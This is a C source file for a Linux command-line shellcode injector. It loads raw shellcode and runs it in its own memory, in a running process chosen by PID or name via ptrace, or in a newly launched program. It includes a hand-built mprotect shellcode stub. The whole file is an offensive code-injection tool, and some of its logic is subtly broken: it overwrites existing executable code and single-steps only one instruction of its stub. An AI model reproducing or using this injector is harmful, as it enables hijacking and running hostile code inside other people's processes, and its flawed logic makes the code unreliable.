#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/uio.h>

#define INJECT_SELF      0  // Inject into current process
#define INJECT_PROCESS   1  // Inject into specified process
#define INJECT_EXECUTABLE 2  // Execute target with injected shellcode

// Memory protection settings
#define MEM_RX  (PROT_READ | PROT_EXEC)
#define MEM_RW  (PROT_READ | PROT_WRITE)
#define MEM_RWX (PROT_READ | PROT_WRITE | PROT_EXEC)

typedef struct {
    int mode;               // Injection mode
    pid_t target_pid;       // Target process ID (for INJECT_PROCESS)
    char *target_exe;       // Target executable (for INJECT_EXECUTABLE)
    char *shellcode_file;   // File containing shellcode
    int force;              // Force injection even if bad chars detected
    int verbose;            // Verbose output
    int detach;             // Detach after injection
    unsigned char *shellcode; // Shellcode buffer
    size_t shellcode_len;   // Shellcode length
} inject_options_t;

// Function prototypes
int load_shellcode(inject_options_t *opts);
int inject_self(inject_options_t *opts);
int inject_process(inject_options_t *opts);
int inject_executable(inject_options_t *opts);
void *find_memory_region(pid_t pid, size_t size);
int write_memory(pid_t pid, void *addr, unsigned char *data, size_t size);
int set_memory_protection(pid_t pid, void *addr, size_t size, int prot);
pid_t find_process_by_name(const char *name);

// Load shellcode from file
int load_shellcode(inject_options_t *opts) {
    FILE *fp;
    long file_size;
    
    fp = fopen(opts->shellcode_file, "rb");
    if (!fp) {
        perror("Failed to open shellcode file");
        return -1;
    }
    
    // Get file size
    fseek(fp, 0, SEEK_END);
    file_size = ftell(fp);
    rewind(fp);
    
    if (file_size <= 0) {
        fprintf(stderr, "Empty shellcode file\n");
        fclose(fp);
        return -1;
    }
    
    // Allocate memory
    opts->shellcode = (unsigned char *)malloc(file_size);
    if (!opts->shellcode) {
        perror("Failed to allocate memory for shellcode");
        fclose(fp);
        return -1;
    }
    
    // Read shellcode
    if (fread(opts->shellcode, 1, file_size, fp) != (size_t)file_size) {
        perror("Failed to read shellcode");
        fclose(fp);
        free(opts->shellcode);
        opts->shellcode = NULL;
        return -1;
    }
    
    fclose(fp);
    opts->shellcode_len = file_size;
    
    // Check for NULL bytes if not forcing
    if (!opts->force) {
        for (size_t i = 0; i < opts->shellcode_len; i++) {
            if (opts->shellcode[i] == 0x00) {
                fprintf(stderr, "Warning: NULL byte detected at offset %zu\n", i);
                fprintf(stderr, "Use --force to inject anyway\n");
                free(opts->shellcode);
                opts->shellcode = NULL;
                return -1;
            }
        }
    }
    
    if (opts->verbose) {
        printf("Loaded %zu bytes of shellcode\n", opts->shellcode_len);
    }
    
    return 0;
}

// Inject shellcode into the current process
int inject_self(inject_options_t *opts) {
    void *mem;
    int (*sc)();
    
    // Allocate RWX memory
    mem = mmap(NULL, opts->shellcode_len, MEM_RWX, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        perror("Failed to allocate memory");
        return -1;
    }
    
    if (opts->verbose) {
        printf("Allocated memory at %p\n", mem);
    }
    
    // Copy shellcode
    memcpy(mem, opts->shellcode, opts->shellcode_len);
    
    // Execute shellcode
    sc = (int (*)())mem;
    if (opts->verbose) {
        printf("Executing shellcode...\n");
    }
    
    // Execute the shellcode
    return sc();
}

// Find a suitable memory region in target process
void *find_memory_region(pid_t pid, size_t size) {
    char maps_file[64];
    FILE *fp;
    char line[256];
    uint64_t start, end;
    char perms[8];
    
    snprintf(maps_file, sizeof(maps_file), "/proc/%d/maps", pid);
    
    fp = fopen(maps_file, "r");
    if (!fp) {
        perror("Failed to open memory maps");
        return NULL;
    }
    
    // Look for an executable memory region with enough space
    while (fgets(line, sizeof(line), fp)) {
        if (sscanf(line, "%lx-%lx %s", &start, &end, perms) != 3) {
            continue;
        }
        
        // Look for executable regions
        if (strchr(perms, 'x') && (end - start) >= size + 0x1000) {
            // Use address after the region to avoid overwriting code
            void *addr = (void *)(end - size - 0x1000);
            fclose(fp);
            return addr;
        }
    }
    
    fclose(fp);
    return NULL;
}

// Write memory to target process
int write_memory(pid_t pid, void *addr, unsigned char *data, size_t size) {
    struct iovec local[1];
    struct iovec remote[1];
    
    local[0].iov_base = data;
    local[0].iov_len = size;
    remote[0].iov_base = addr;
    remote[0].iov_len = size;
    
    if (process_vm_writev(pid, local, 1, remote, 1, 0) != (ssize_t)size) {
        // Fall back to ptrace if process_vm_writev fails
        long *ptr = (long *)data;
        size_t i;
        
        for (i = 0; i < (size / sizeof(long)); i++) {
            if (ptrace(PTRACE_POKETEXT, pid, (void *)((uint64_t)addr + i * sizeof(long)), ptr[i]) < 0) {
                perror("ptrace(POKETEXT)");
                return -1;
            }
        }
        
        // Handle remaining bytes
        if (size % sizeof(long)) {
            long tmp = ptrace(PTRACE_PEEKTEXT, pid, (void *)((uint64_t)addr + i * sizeof(long)), NULL);
            if (tmp == -1 && errno) {
                perror("ptrace(PEEKTEXT)");
                return -1;
            }
            
            memcpy(&tmp, data + i * sizeof(long), size % sizeof(long));
            
            if (ptrace(PTRACE_POKETEXT, pid, (void *)((uint64_t)addr + i * sizeof(long)), tmp) < 0) {
                perror("ptrace(POKETEXT)");
                return -1;
            }
        }
    }
    
    return 0;
}

// Set memory protection in target process
int set_memory_protection(pid_t pid, void *addr, size_t size, int prot) {
    char procmem[64];
    int fd;
    
    snprintf(procmem, sizeof(procmem), "/proc/%d/mem", pid);
    
    fd = open(procmem, O_RDWR);
    if (fd < 0) {
        perror("Failed to open process memory");
        return -1;
    }
    
    // Use process_vm_writev to change memory protection
    unsigned char shellcode[] = {
        0x48, 0xc7, 0xc0, 0x0a, 0x00, 0x00, 0x00,  // mov rax, 10 (mprotect)
        0x48, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rdi, addr
        0x48, 0xbe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rsi, size
        0x48, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rdx, prot
        0x0f, 0x05,  // syscall
        0xc3        // ret
    };
    
    // Set parameters in shellcode
    *(uint64_t *)&shellcode[9] = (uint64_t)addr;
    *(uint64_t *)&shellcode[19] = (uint64_t)size;
    *(uint64_t *)&shellcode[29] = (uint64_t)prot;
    
    // Find a temporary memory region to execute our mprotect shellcode
    void *tmp_addr = find_memory_region(pid, sizeof(shellcode));
    if (!tmp_addr) {
        close(fd);
        return -1;
    }
    
    // Write mprotect shellcode
    if (write_memory(pid, tmp_addr, shellcode, sizeof(shellcode)) < 0) {
        close(fd);
        return -1;
    }
    
    // Create an injector thread that calls our shellcode
    struct user_regs_struct regs, saved_regs;
    
    // Save registers
    if (ptrace(PTRACE_GETREGS, pid, NULL, &saved_regs) < 0) {
        perror("ptrace(GETREGS)");
        close(fd);
        return -1;
    }
    
    // Setup call to our mprotect shellcode
    memcpy(&regs, &saved_regs, sizeof(regs));
    regs.rip = (uint64_t)tmp_addr;
    
    // Set registers
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) {
        perror("ptrace(SETREGS)");
        close(fd);
        return -1;
    }
    
    // Continue execution (single step)
    if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) < 0) {
        perror("ptrace(SINGLESTEP)");
        close(fd);
        return -1;
    }
    
    // Wait for process to stop
    int status;
    waitpid(pid, &status, 0);
    
    // Restore original registers
    if (ptrace(PTRACE_SETREGS, pid, NULL, &saved_regs) < 0) {
        perror("ptrace(SETREGS)");
        close(fd);
        return -1;
    }
    
    close(fd);
    return 0;
}

// Inject shellcode into target process
int inject_process(inject_options_t *opts) {
    pid_t pid = opts->target_pid;
    int status;
    struct user_regs_struct regs, saved_regs;
    void *addr;
    
    // Attach to process
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        perror("ptrace(ATTACH)");
        return -1;
    }
    
    // Wait for process to stop
    waitpid(pid, &status, 0);
    
    if (opts->verbose) {
        printf("Attached to process %d\n", pid);
    }
    
    // Find a suitable memory region
    addr = find_memory_region(pid, opts->shellcode_len);
    if (!addr) {
        fprintf(stderr, "Failed to find suitable memory region\n");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }
    
    if (opts->verbose) {
        printf("Found memory region at %p\n", addr);
    }
    
    // Set memory protection to RW
    if (set_memory_protection(pid, addr, opts->shellcode_len, MEM_RW) < 0) {
        fprintf(stderr, "Failed to set memory protection\n");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }
    
    // Write shellcode
    if (write_memory(pid, addr, opts->shellcode, opts->shellcode_len) < 0) {
        fprintf(stderr, "Failed to write shellcode\n");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }
    
    if (opts->verbose) {
        printf("Shellcode written to memory\n");
    }
    
    // Set memory protection to RX
    if (set_memory_protection(pid, addr, opts->shellcode_len, MEM_RX) < 0) {
        fprintf(stderr, "Failed to set memory protection\n");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }
    
    // Save registers
    if (ptrace(PTRACE_GETREGS, pid, NULL, &saved_regs) < 0) {
        perror("ptrace(GETREGS)");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }
    
    // Setup call to shellcode
    memcpy(&regs, &saved_regs, sizeof(regs));
    regs.rip = (uint64_t)addr;
    
    // Set registers
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) {
        perror("ptrace(SETREGS)");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }
    
    if (opts->verbose) {
        printf("Executing shellcode at %p\n", addr);
    }
    
    // Detach or continue execution
    if (opts->detach) {
        if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
            perror("ptrace(DETACH)");
            return -1;
        }
        
        if (opts->verbose) {
            printf("Detached from process %d\n", pid);
        }
    } else {
        // Continue execution
        if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {
            perror("ptrace(CONT)");
            return -1;
        }
        
        if (opts->verbose) {
            printf("Continuing execution...\n");
        }
    }
    
    return 0;
}

// Execute target with injected shellcode
int inject_executable(inject_options_t *opts) {
    pid_t pid;
    int status;
    
    // Fork a new process
    pid = fork();
    if (pid < 0) {
        perror("fork");
        return -1;
    }
    
    if (pid == 0) {
        // Child process
        
        // Allow parent to trace us
        if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) < 0) {
            perror("ptrace(TRACEME)");
            exit(EXIT_FAILURE);
        }
        
        // Execute target
        execl(opts->target_exe, opts->target_exe, NULL);
        perror("execl");
        exit(EXIT_FAILURE);
    }
    
    // Parent process
    
    // Wait for child to stop
    waitpid(pid, &status, 0);
    
    if (opts->verbose) {
        printf("Launched process %d\n", pid);
    }
    
    // Save target PID and perform regular process injection
    opts->target_pid = pid;
    return inject_process(opts);
}

// Find process by name
pid_t find_process_by_name(const char *name) {
    DIR *dir;
    struct dirent *ent;
    char path[512];
    char cmdline[512];
    FILE *fp;
    pid_t pid = -1;
    
    dir = opendir("/proc");
    if (!dir) {
        perror("opendir");
        return -1;
    }
    
    while ((ent = readdir(dir)) != NULL) {
        // Skip non-numeric entries
        if (!isdigit(ent->d_name[0])) {
            continue;
        }
        
        // Get process cmdline
        snprintf(path, sizeof(path), "/proc/%s/cmdline", ent->d_name);
        fp = fopen(path, "r");
        if (!fp) {
            continue;
        }
        
        if (fgets(cmdline, sizeof(cmdline), fp) == NULL) {
            fclose(fp);
            continue;
        }
        
        fclose(fp);
        
        // Replace null bytes with spaces for easier parsing
        for (size_t i = 0; i < sizeof(cmdline) && cmdline[i]; i++) {
            if (cmdline[i] == '\0') {
                cmdline[i] = ' ';
            }
        }
        
        // Extract executable name from path
        char *base = strrchr(cmdline, '/');
        base = base ? base + 1 : cmdline;
        
        // Compare with target name
        if (strncmp(base, name, strlen(name)) == 0) {
            pid = atoi(ent->d_name);
            break;
        }
    }
    
    closedir(dir);
    return pid;
}

void print_usage(const char *prog) {
    printf("Usage: %s [options]\n", prog);
    printf("Options:\n");
    printf("  -s, --self                Inject into self (default)\n");
    printf("  -p, --pid PID             Inject into process ID\n");
    printf("  -n, --process-name NAME   Inject into process with name\n");
    printf("  -e, --exec FILE           Execute FILE with shellcode\n");
    printf("  -c, --shellcode FILE      Use shellcode from FILE\n");
    printf("  -f, --force               Force injection (ignore bad chars)\n");
    printf("  -d, --detach              Detach after injection\n");
    printf("  -v, --verbose             Verbose output\n");
    printf("  -h, --help                Display this help\n");
}

int main(int argc, char *argv[]) {
    inject_options_t opts = {
        .mode = INJECT_SELF,
        .target_pid = -1,
        .target_exe = NULL,
        .shellcode_file = NULL,
        .force = 0,
        .verbose = 0,
        .detach = 0,
        .shellcode = NULL,
        .shellcode_len = 0
    };
    int i;
    
    // Parse arguments
    for (i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-s") == 0 || strcmp(argv[i], "--self") == 0) {
            opts.mode = INJECT_SELF;
        } else if (strcmp(argv[i], "-p") == 0 || strcmp(argv[i], "--pid") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "Missing PID argument\n");
                print_usage(argv[0]);
                return 1;
            }
            opts.mode = INJECT_PROCESS;
            opts.target_pid = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-n") == 0 || strcmp(argv[i], "--process-name") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "Missing process name argument\n");
                print_usage(argv[0]);
                return 1;
            }
            opts.mode = INJECT_PROCESS;
            opts.target_pid = find_process_by_name(argv[++i]);
            if (opts.target_pid == -1) {
                fprintf(stderr, "Process not found: %s\n", argv[i]);
                return 1;
            }
        } else if (strcmp(argv[i], "-e") == 0 || strcmp(argv[i], "--exec") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "Missing executable argument\n");
                print_usage(argv[0]);
                return 1;
            }
            opts.mode = INJECT_EXECUTABLE;
            opts.target_exe = argv[++i];
        } else if (strcmp(argv[i], "-c") == 0 || strcmp(argv[i], "--shellcode") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "Missing shellcode file argument\n");
                print_usage(argv[0]);
                return 1;
            }
            opts.shellcode_file = argv[++i];
        } else if (strcmp(argv[i], "-f") == 0 || strcmp(argv[i], "--force") == 0) {
            opts.force = 1;
        } else if (strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--detach") == 0) {
            opts.detach = 1;
        } else if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0) {
            opts.verbose = 1;
        } else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            print_usage(argv[0]);
            return 0;
        } else {
            fprintf(stderr, "Unknown option: %s\n", argv[i]);
            print_usage(argv[0]);
            return 1;
        }
    }
    
    // Check for required arguments
    if (!opts.shellcode_file) {
        fprintf(stderr, "Missing required argument: shellcode file\n");
        print_usage(argv[0]);
        return 1;
    }
    
    if (opts.mode == INJECT_PROCESS && opts.target_pid == -1) {
        fprintf(stderr, "Missing required argument: target PID\n");
        print_usage(argv[0]);
        return 1;
    }
    
    if (opts.mode == INJECT_EXECUTABLE && !opts.target_exe) {
        fprintf(stderr, "Missing required argument: target executable\n");
        print_usage(argv[0]);
        return 1;
    }
    
    // Load shellcode
    if (load_shellcode(&opts) < 0) {
        return 1;
    }
    
    // Perform injection based on mode
    int result;
    switch (opts.mode) {
        case INJECT_SELF:
            result = inject_self(&opts);
            break;
        case INJECT_PROCESS:
            result = inject_process(&opts);
            break;
        case INJECT_EXECUTABLE:
            result = inject_executable(&opts);
            break;
        default:
            fprintf(stderr, "Unknown injection mode\n");
            result = -1;
    }
    
    // Cleanup
    if (opts.shellcode) {
        free(opts.shellcode);
    }
    
    return (result < 0) ? 1 : 0;
}